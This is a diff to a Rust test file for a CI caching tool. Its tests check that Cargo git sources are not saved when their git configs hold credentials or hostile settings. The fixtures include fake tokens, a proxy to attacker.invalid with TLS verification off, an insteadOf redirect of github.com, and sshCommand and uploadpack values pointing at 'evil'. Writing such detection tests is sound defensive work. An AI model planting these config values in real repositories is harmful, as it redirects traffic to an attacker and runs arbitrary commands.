@@ -4,15 +4,13 @@
 use std::process::Output;
 
 use crate::cache_private_repo::{
-    GIT_LOCK, PRIVATE, TOKEN, decide_in, decide_with, decide_without_home, private_checkout,
+    GIT_LOCK, decide_in, decide_with, decide_without_home, private_checkout,
 };
-use crate::fetch::serve_body;
 
 fn saved_sources_with(name: &str, relative: &str, content: &str) -> (Output, String) {
     let repo = private_checkout(name, GIT_LOCK);
     repo.write_unstaged(&format!("home/{relative}"), content);
-    let api = serve_body(200, PRIVATE).unwrap_or_else(|e| unreachable!("{e}"));
-    decide_with(&repo, Some(&api), Some(TOKEN))
+    decide_with(&repo, Some("true"))
 }
 
 fn sources_save_stops(cases: &[(&str, &str, &str)]) {
@@ -81,8 +79,7 @@ fn a_credential_under_home_is_found_even_when_cargo_home_is_elsewhere() {
         "home/.cargo/git/db/shared-1/.git-credentials",
         "https://x-access-token:ghs_secret@github.com\n",
     );
-    let api = serve_body(200, PRIVATE).unwrap_or_else(|e| unreachable!("{e}"));
-    let (output, written) = decide_in(&repo, Some(&api), Some(TOKEN), Some("elsewhere"));
+    let (output, written) = decide_in(&repo, Some("true"), Some("elsewhere"));
     assert!(output.status.success(), "{output:?}");
     assert_eq!(written, "save=true\nsources=false\n", "{output:?}");
 }
@@ -120,8 +117,7 @@ fn plain_git_data_inside_the_saved_sources_paths_is_saved() {
 #[test]
 fn sources_are_not_saved_when_home_is_unset_and_the_saved_paths_cannot_be_checked() {
     let repo = private_checkout("decide-no-home", GIT_LOCK);
-    let api = serve_body(200, PRIVATE).unwrap_or_else(|e| unreachable!("{e}"));
-    let (output, written) = decide_without_home(&repo, Some(&api), Some(TOKEN), Some("cargo-home"));
+    let (output, written) = decide_without_home(&repo, Some("true"), Some("cargo-home"));
     assert!(output.status.success(), "{output:?}");
     assert_eq!(written, "save=true\nsources=false\n", "{output:?}");
 }
@@ -232,4 +228,59 @@ fn token_alone_stops_the_sources_save() {
         ".cargo/git/db/shared-1/config",
         "[credential]\n\thelper = token\n",
     )]);
+}
+
+#[test]
+fn a_userinfo_url_split_by_a_git_config_continuation_stops_the_sources_save() {
+    sources_save_stops(&[(
+        "continued-url",
+        ".cargo/git/db/shared-1/config",
+        "[remote \"origin\"]\n\turl = https://deploy:sec\\\nret@github.com/acme/shared-lib\n",
+    )]);
+}
+
+#[test]
+fn a_git_config_that_delegates_credentials_or_changes_transport_stops_the_sources_save() {
+    sources_save_stops(&[
+        (
+            "credential-store-file",
+            ".cargo/git/db/shared-1/config",
+            "[credential]\n\thelper = store --file=/home/runner/.cargo/git/db/shared-1/opaque\n",
+        ),
+        (
+            "proxy-without-verification",
+            ".cargo/git/db/shared-1/config",
+            "[http]\n\tproxy = http://attacker.invalid:3128\n\tsslVerify = false\n",
+        ),
+        (
+            "ssh-command",
+            ".cargo/git/db/shared-1/config",
+            "[core]\n\tbare = true\n\tsshCommand = ssh -o ProxyCommand=evil\n",
+        ),
+        (
+            "include",
+            ".cargo/git/db/shared-1/config",
+            "[include]\n\tpath = /tmp/elsewhere\n",
+        ),
+        (
+            "insteadof",
+            ".cargo/git/db/shared-1/config",
+            "[url \"https://attacker.invalid/\"]\n\tinsteadOf = https://github.com/\n",
+        ),
+        (
+            "upload-pack",
+            ".cargo/git/db/shared-1/config",
+            "[remote \"origin\"]\n\turl = https://github.com/acme/shared-lib\n\tuploadpack = evil\n",
+        ),
+        (
+            "same-line-key",
+            ".cargo/git/db/shared-1/config",
+            "[http] proxy = http://attacker.invalid:3128\n",
+        ),
+        (
+            "worktree-config",
+            ".cargo/git/db/shared-1/config.worktree",
+            "[http]\n\tproxy = http://attacker.invalid:3128\n",
+        ),
+    ]);
 }
